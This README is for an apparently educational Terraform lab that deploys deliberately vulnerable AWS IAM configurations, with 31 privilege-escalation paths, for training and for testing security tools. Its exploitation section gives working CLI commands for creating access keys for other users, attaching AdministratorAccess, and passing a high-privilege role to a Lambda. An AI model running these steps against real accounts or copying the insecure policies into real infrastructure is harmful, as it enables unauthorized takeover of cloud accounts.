# AWS IAM Vulnerable

Intentionally vulnerable AWS IAM configurations for learning privilege escalation and testing security tools.

## Prerequisites

1. **AWS Account**: An isolated test account with no production resources
2. **AWS CLI**: Installed and configured
3. **Terraform**: Version 1.0+
4. **Permissions**: Administrative access to the account

## Quick Start

```bash
# Configure your AWS CLI (if not already done)
aws configure

# Set your profile (optional)
export AWS_PROFILE="your-profile-name"

# Deploy
terraform init
terraform apply
```

## Configuration

Edit `terraform.tfvars` (copy from `terraform.tfvars.example`):

```hcl
# Optional: Use a specific AWS CLI profile
aws_local_profile = "default"

# Optional: Specify a different ARN that can assume the created roles
# aws_assume_role_arn = "arn:aws:iam::112233445566:user/you"
```

## What Gets Created

### Free Resources (Default)

**31 Privilege Escalation Scenarios** grouped by category:

| # | Scenario | Permission(s) | Cost |
|---|----------|---------------|------|
| **IAM Permissions on Other Users** | | | |
| 4 | CreateAccessKey | `iam:CreateAccessKey` | Free |
| 5 | CreateLoginProfile | `iam:CreateLoginProfile` | Free |
| 6 | UpdateLoginProfile | `iam:UpdateLoginProfile` | Free |
| **Permissions on Policies** | | | |
| 1 | CreateNewPolicyVersion | `iam:CreatePolicyVersion` | Free |
| 2 | SetExistingDefaultPolicyVersion | `iam:SetDefaultPolicyVersion` | Free |
| 7 | AttachUserPolicy | `iam:AttachUserPolicy` | Free |
| 8 | AttachGroupPolicy | `iam:AttachGroupPolicy` | Free |
| 9 | AttachRolePolicy | `iam:AttachRolePolicy` | Free |
| 10 | PutUserPolicy | `iam:PutUserPolicy` | Free |
| 11 | PutGroupPolicy | `iam:PutGroupPolicy` | Free |
| 12 | PutRolePolicy | `iam:PutRolePolicy` | Free |
| 13 | AddUserToGroup | `iam:AddUserToGroup` | Free |
| 14 | UpdatingAssumeRolePolicy | `iam:UpdateAssumeRolePolicy` | Free |
| **PassRole to Service** | | | |
| 3 | CreateEC2WithExistingIP | `iam:PassRole` + `ec2:RunInstances` | Free |
| 15 | PassExistingRoleToNewLambdaThenInvoke | `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Free |
| 16 | PassRoleToNewLambdaThenTrigger | `iam:PassRole` + `lambda:CreateFunction` + DynamoDB trigger | Free |
| 18 | PassExistingRoleToNewGlueDevEndpoint | `iam:PassRole` + `glue:CreateDevEndpoint` | Free |
| 20 | PassExistingRoleToCloudFormation | `iam:PassRole` + `cloudformation:CreateStack` | Free |
| 21 | PassExistingRoleToNewDataPipeline | `iam:PassRole` + `datapipeline:CreatePipeline` | Free |
| - | CodeBuildCreateProjectPassRole | `iam:PassRole` + `codebuild:CreateProject` | Free |
| - | SageMakerCreateNotebookPassRole | `iam:PassRole` + `sagemaker:CreateNotebookInstance` | Free |
| - | SageMakerCreateTrainingJobPassRole | `iam:PassRole` + `sagemaker:CreateTrainingJob` | Free |
| - | SageMakerCreateProcessingJobPassRole | `iam:PassRole` + `sagemaker:CreateProcessingJob` | Free |
| **AWS Service Escalation** | | | |
| 17 | EditExistingLambdaFunctionWithRole | `lambda:UpdateFunctionCode` | Free |
| 19 | UpdateExistingGlueDevEndpoint | `glue:UpdateDevEndpoint` | Free |
| - | CloudFormationUpdateStack | `cloudformation:UpdateStack` | Free |
| - | SageMakerCreatePresignedNotebookURL | `sagemaker:CreatePresignedNotebookInstanceUrl` | Free |
| - | EC2InstanceConnect-SendSSHPublicKey | `ec2-instance-connect:SendSSHPublicKey` | Free |
| - | SSM-SendCommand | `ssm:SendCommand` | Free |
| - | SSM-StartSession | `ssm:StartSession` | Free |
| **AssumeRole** | | | |
| - | AssumeRole | `sts:AssumeRole` (permissive trust) | Free |

> **Note:** "Free" means only IAM resources are created (no cost). Exploitation of some paths (EC2, Lambda, Glue, etc.) requires creating actual resources which may incur costs.

**Tool Testing Resources:**
- False Negative tests (should be detected)
- False Positive tests (should not be flagged)

### Non-Free Resources (Optional)

Enable by uncommenting modules in `main.tf`:

| Module | Cost/Hour | Cost/Month | Description |
|--------|-----------|------------|-------------|
| EC2 | ~$0.006 | ~$4.50 | t3.micro instance for SSM/EC2 Instance Connect |
| Lambda | $0 | Free tier | Lambda function with privileged role |
| Glue | ~$4 | ~$4/hr when running | Glue dev endpoint |
| SageMaker | Varies | Varies | Notebook instance |
| CloudFormation | ~$0.0006 | ~$0.40 | Stack with privileged role |

**Example - Enable EC2 module in `main.tf`:**
```hcl
module "ec2" {
  source = "./modules/non-free-resources/ec2"
  aws_assume_role_arn = (var.aws_assume_role_arn != "" ? var.aws_assume_role_arn : data.aws_caller_identity.current.arn)
}
```

## Cost Summary

| Configuration | Cost/Month |
|---------------|------------|
| **Default (31 IAM paths only)** | **$0** |
| + EC2 module | +$4.50 |
| + Lambda module | Free tier |
| + Glue module (when running) | ~$4/hr |
| + SageMaker module | Varies |
| + CloudFormation module | ~$0.40 |

**Note:** The default deployment creates only IAM resources (users, roles, policies) which are **completely free**. Non-free modules must be explicitly uncommented in `main.tf`.

## Testing with Security Tools

```bash
# Principal Mapper (PMapper)
pmapper graph create
pmapper analysis
pmapper visualize --filetype png

# Pacu
python3 pacu.py
# Inside Pacu:
# > import_keys --all
# > run iam__privesc_scan

# Cloudsplaining
cloudsplaining download --profile default
cloudsplaining scan --input-file default.json

# FoxMapper
foxmapper aws graph create
foxmapper aws argquery --preset privesc
```

## Cleanup

### Standard Cleanup

```bash
terraform destroy
```

### When Terraform State is Lost

```bash
cd cleanup-scripts

# Preview what will be deleted
./cleanup_iam_vulnerable.sh --dry-run

# Execute cleanup
./cleanup_iam_vulnerable.sh
```

## Security Warning

**These resources are intentionally insecure.** Only deploy in:
- Isolated test accounts
- Accounts with no sensitive data
- Accounts not connected to production systems

## Exploitation Quick Start

This section provides a quick introduction to exploiting the privilege escalation paths.

### How It Works

Each privesc path follows this pattern:
1. **Attacker** assumes a role or uses credentials for a **vulnerable IAM principal**
2. The **vulnerable principal** has permissions that allow escalation to a **high-privilege role**
3. The **high-privilege role** (`privesc-high-priv-service-role`) has administrative access

### Basic Exploitation

```bash
# Set your account ID
export ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

# Method 1: Assume a vulnerable role
aws sts assume-role \
  --role-arn arn:aws:iam::$ACCOUNT_ID:role/privesc4-CreateAccessKey-role \
  --role-session-name attacker

# Method 2: Use vulnerable user credentials (from Terraform output)
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
```

### Example: Path 4 - CreateAccessKey

```bash
# Assume the vulnerable role
CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::$ACCOUNT_ID:role/privesc4-CreateAccessKey-role \
  --role-session-name attacker)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.Credentials.SessionToken')

# Create access key for another user (e.g., admin user)
aws iam create-access-key --user-name TARGET_USER

# Use the new credentials to access as the target user
```

### Example: Path 7 - AttachUserPolicy

```bash
# Assume the vulnerable role
# ... (same as above with privesc7-AttachUserPolicy-role)

# Attach admin policy to your user
aws iam attach-user-policy \
  --user-name privesc7-AttachUserPolicy-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Now the user has admin access
```

### Example: Path 15 - PassRole to Lambda

```bash
# Assume the vulnerable role
# ... (same as above with privesc15-PassExistingRoleToNewLambdaThenInvoke-role)

# Create a malicious Lambda function with the high-priv role
cat > /tmp/lambda.py << 'EOF'
import boto3
def handler(event, context):
    sts = boto3.client('sts')
    return sts.get_caller_identity()
EOF
zip /tmp/lambda.zip /tmp/lambda.py

aws lambda create-function \
  --function-name evil-function \
  --runtime python3.9 \
  --handler lambda.handler \
  --role arn:aws:iam::$ACCOUNT_ID:role/privesc-high-priv-service-role \
  --zip-file fileb:///tmp/lambda.zip

# Invoke to execute as high-priv role
aws lambda invoke --function-name evil-function /tmp/output.json
cat /tmp/output.json
```

### Quick Reference: Vulnerable Principals

| Path | Role Name | User Name |
|------|-----------|-----------|
| 1 | privesc1-CreateNewPolicyVersion-role | privesc1-CreateNewPolicyVersion-user |
| 2 | privesc2-SetExistingDefaultPolicyVersion-role | privesc2-SetExistingDefaultPolicyVersion-user |
| 3 | privesc3-CreateEC2WithExistingIP-role | privesc3-CreateEC2WithExistingIP-user |
| 4 | privesc4-CreateAccessKey-role | privesc4-CreateAccessKey-user |
| 5 | privesc5-CreateLoginProfile-role | privesc5-CreateLoginProfile-user |
| 6 | privesc6-UpdateLoginProfile-role | privesc6-UpdateLoginProfile-user |
| 7 | privesc7-AttachUserPolicy-role | privesc7-AttachUserPolicy-user |
| 8 | privesc8-AttachGroupPolicy-role | privesc8-AttachGroupPolicy-user |
| 9 | privesc9-AttachRolePolicy-role | privesc9-AttachRolePolicy-user |
| 10 | privesc10-PutUserPolicy-role | privesc10-PutUserPolicy-user |
| 11 | privesc11-PutGroupPolicy-role | privesc11-PutGroupPolicy-user |
| 12 | privesc12-PutRolePolicy-role | privesc12-PutRolePolicy-user |
| 13 | privesc13-AddUserToGroup-role | privesc13-AddUserToGroup-user |
| 14 | privesc14-UpdatingAssumeRolePolicy-role | privesc14-UpdatingAssumeRolePolicy-user |
| 15 | privesc15-PassExistingRoleToNewLambdaThenInvoke-role | privesc15-PassExistingRoleToNewLambdaThenInvoke-user |
| 16 | privesc16-PassRoleToNewLambdaThenTriggerWithNewDynamo-role | privesc16-PassRoleToNewLambdaThenTriggerWithNewDynamo-user |
| 17 | privesc17-EditExistingLambdaFunctionWithRole-role | privesc17-EditExistingLambdaFunctionWithRole-user |
| 18 | privesc18-PassExistingRoleToNewGlueDevEndpoint-role | privesc18-PassExistingRoleToNewGlueDevEndpoint-user |
| 19 | privesc19-UpdateExistingGlueDevEndpoint-role | privesc19-UpdateExistingGlueDevEndpoint-user |
| 20 | privesc20-PassExistingRoleToCloudFormation-role | privesc20-PassExistingRoleToCloudFormation-user |
| 21 | privesc21-PassExistingRoleToNewDataPipeline-role | privesc21-PassExistingRoleToNewDataPipeline-user |

## Architecture

```
aws/
├── main.tf                    # Root configuration
├── variables.tf               # Input variables
├── terraform.tfvars.example   # Example configuration
├── cleanup-scripts/           # Manual cleanup tools
│   ├── CLEANUP_README.md
│   ├── cleanup_iam_vulnerable.sh
│   └── cleanup_iam_vulnerable.py
└── modules/
    ├── free-resources/
    │   ├── privesc-paths/     # 31 privilege escalation paths
    │   │   ├── privesc1-*.tf  # Individual paths
    │   │   └── ...
    │   └── tool-testing/      # FN/FP test cases
    └── non-free-resources/
        ├── ec2/               # EC2 instance
        ├── lambda/            # Lambda function
        ├── glue/              # Glue dev endpoint
        ├── sagemaker/         # SageMaker notebook
        └── cloudformation/    # CloudFormation stack
```

## References

- [AWS Privilege Escalation Methods and Mitigation - Rhino Security](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [AWS Privilege Escalation Part 2 - Rhino Security](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)
- [Privilege Escalation in AWS - Bishop Fox](https://labs.bishopfox.com/tech-blog/privilege-escalation-in-aws)
- [AWS IAM Documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/)
